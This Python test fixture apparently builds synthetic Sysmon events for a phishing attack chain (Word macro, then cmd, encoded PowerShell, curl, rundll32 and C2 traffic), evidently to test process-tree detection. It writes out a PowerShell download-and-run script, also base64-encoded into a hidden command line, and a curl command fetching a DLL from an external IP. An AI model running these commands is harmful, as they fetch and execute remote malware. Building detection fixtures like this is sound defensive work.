"""Golden test case: Phishing Macro LOLBin chain (Office -> cmd -> PowerShell -> download -> payload)."""
import base64
import hashlib
import random

HOST = "WS-FIN-07.corp.local"
DAY = "2026-06-10T"
ADMIN = "CORP\\Administrator"


def g(tag):
    return "{6a1f3c2e-" + tag + "-6668-0c01-000000002a00}"


USERINIT, EXPLORER, CHROME, WINWORD = g("1a20"), g("1a22"), g("1b31"), g("2c40")
CMD, PS, CURL, MALWARE, RUNDLL, WHOAMI = g("2c41"), g("2c42"), g("2c43"), g("2c44"), g("2c45"), g("2c46")
WININIT, SERVICES, SVCHOST, TASKHOST = g("0a01"), g("0a02"), g("0a03"), g("0a04")

GOLDEN_TARGET = PS

PS_SCRIPT = ("IEX (New-Object Net.WebClient).DownloadFile('https://185.220.101.47/update.exe',"
             "'C:\\Users\\Public\\malware.exe'); Start-Process C:\\Users\\Public\\malware.exe")
PS_ENC = base64.b64encode(PS_SCRIPT.encode("utf-16-le")).decode()


def _hashes(image):
    return (f"SHA256={hashlib.sha256(image.encode()).hexdigest().upper()},"
            f"MD5={hashlib.md5(image.encode()).hexdigest().upper()}")


def proc(ts, guid, pid, image, cmd, pguid, ppid, pimage, user=ADMIN, integrity="High"):
    return {"event_id": 1, "timestamp": DAY + ts, "computer": HOST, "event_data": {
        "UtcTime": DAY + ts, "ProcessGuid": guid, "ProcessId": pid, "Image": image, "CommandLine": cmd,
        "User": user, "IntegrityLevel": integrity, "Hashes": _hashes(image),
        "ParentProcessGuid": pguid, "ParentProcessId": ppid, "ParentImage": pimage}}


def net(ts, guid, pid, image, ip, port, hostname="", proto="tcp", sport=49700):
    return {"event_id": 3, "timestamp": DAY + ts, "computer": HOST, "event_data": {
        "UtcTime": DAY + ts, "ProcessGuid": guid, "ProcessId": pid, "Image": image, "Protocol": proto,
        "SourceIp": "10.20.4.57", "SourcePort": sport, "DestinationIp": ip, "DestinationPort": port,
        "DestinationHostname": hostname}}


def fcreate(ts, guid, pid, image, target):
    return {"event_id": 11, "timestamp": DAY + ts, "computer": HOST, "event_data": {
        "UtcTime": DAY + ts, "ProcessGuid": guid, "ProcessId": pid, "Image": image, "TargetFilename": target}}


W = "C:\\Windows\\System32\\"
PS_IMG = W + "WindowsPowerShell\\v1.0\\powershell.exe"
WORD_IMG = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
MAL_IMG = "C:\\Users\\Public\\malware.exe"

EVENTS = [
    # benign system tree (not connected to the attack chain)
    proc("10:00:02.104Z", SERVICES, 712, W + "services.exe", W + "services.exe", WININIT, 604, W + "wininit.exe", "NT AUTHORITY\\SYSTEM", "System"),
    proc("10:00:05.330Z", SVCHOST, 1288, W + "svchost.exe", W + "svchost.exe -k netsvcs -p", SERVICES, 712, W + "services.exe", "NT AUTHORITY\\SYSTEM", "System"),
    proc("10:12:41.902Z", TASKHOST, 6020, W + "taskhostw.exe", "taskhostw.exe", SVCHOST, 1288, W + "svchost.exe", "NT AUTHORITY\\SYSTEM", "System"),
    # user session
    proc("10:20:12.511Z", EXPLORER, 3312, "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE", USERINIT, 3290, W + "userinit.exe", ADMIN, "Medium"),
    proc("10:20:40.020Z", CHROME, 5560, "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "\"chrome.exe\" --profile-directory=Default", EXPLORER, 3312, "C:\\Windows\\explorer.exe", ADMIN, "Medium"),
    net("10:20:41.300Z", CHROME, 5560, "chrome.exe", "142.250.190.78", 443, "mail.google.com", sport=49688),
    fcreate("10:20:58.712Z", CHROME, 5560, "chrome.exe", "C:\\Users\\Administrator\\Downloads\\Invoice_Q2_2026.docm"),
    # attack chain
    proc("10:21:03.118Z", WINWORD, 5124, WORD_IMG, "\"WINWORD.EXE\" /n \"C:\\Users\\Administrator\\Downloads\\Invoice_Q2_2026.docm\"", EXPLORER, 3312, "C:\\Windows\\explorer.exe", ADMIN, "Medium"),
    fcreate("10:21:03.904Z", WINWORD, 5124, "WINWORD.EXE", "C:\\Users\\Administrator\\AppData\\Local\\Temp\\~WRF0001.tmp"),
    proc("10:21:04.207Z", CMD, 6612, W + "cmd.exe", f"cmd.exe /c powershell -nop -w hidden -enc {PS_ENC}", WINWORD, 5124, WORD_IMG),
    proc("10:21:05.031Z", PS, 4820, PS_IMG, f"powershell -nop -w hidden -enc {PS_ENC}", CMD, 6612, W + "cmd.exe"),
    net("10:21:05.880Z", PS, 4820, "powershell.exe", "185.220.101.47", 443, "cdn-update-check.net", sport=49712),
    proc("10:21:06.144Z", CURL, 8104, W + "curl.exe", "curl.exe -s -k -o C:\\Users\\Public\\payload.dll https://185.220.101.47/payload.dll", PS, 4820, PS_IMG),
    net("10:21:06.402Z", CURL, 8104, "curl.exe", "185.220.101.47", 443, "cdn-update-check.net", sport=49714),
    fcreate("10:21:06.950Z", CURL, 8104, "curl.exe", "C:\\Users\\Public\\payload.dll"),
    fcreate("10:21:07.012Z", PS, 4820, "powershell.exe", MAL_IMG),
    proc("10:21:07.533Z", MALWARE, 7740, MAL_IMG, MAL_IMG, PS, 4820, PS_IMG),
    net("10:21:08.210Z", MALWARE, 7740, "malware.exe", "45.137.21.9", 443, "", sport=49720),
    proc("10:21:09.101Z", RUNDLL, 2216, W + "rundll32.exe", "rundll32.exe C:\\Users\\Public\\payload.dll,DllRegisterServer", PS, 4820, PS_IMG),
    net("10:21:09.640Z", RUNDLL, 2216, "rundll32.exe", "45.137.21.9", 8080, "", sport=49722),
    proc("10:21:10.377Z", WHOAMI, 9012, W + "whoami.exe", "whoami /all", MALWARE, 7740, MAL_IMG),
    fcreate("10:21:11.090Z", MALWARE, 7740, "malware.exe", "C:\\Users\\Public\\svc_cache.dat"),
]

SUGGESTED_TARGETS = [
    {"process_guid": PS, "label": "powershell.exe", "note": "Golden case: encoded PowerShell"},
    {"process_guid": WINWORD, "label": "WINWORD.EXE", "note": "Macro-enabled document"},
    {"process_guid": MALWARE, "label": "malware.exe", "note": "Dropped payload in C:\\Users\\Public"},
    {"process_guid": EXPLORER, "label": "explorer.exe", "note": "Full user-session tree"},
    {"process_guid": SVCHOST, "label": "svchost.exe", "note": "Benign baseline"},
]


def shuffled_events():
    """Simulate out-of-order arrival from the indexer."""
    events = [dict(e) for e in EVENTS]
    random.Random(7).shuffle(events)
    return events
